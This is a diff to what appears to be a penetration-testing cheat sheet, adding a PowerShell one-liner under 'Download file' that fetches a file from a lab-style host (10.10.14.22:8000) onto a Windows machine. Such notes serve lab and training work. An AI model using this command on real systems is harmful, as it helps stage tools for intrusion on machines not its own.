@@ -148,6 +148,10 @@ Get-PSDrive
 ```
 Set-Location C:
 ```
+- Download file
+```
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.14.22:8000/file','filename')"
+```
 
 ### Password Crack
 
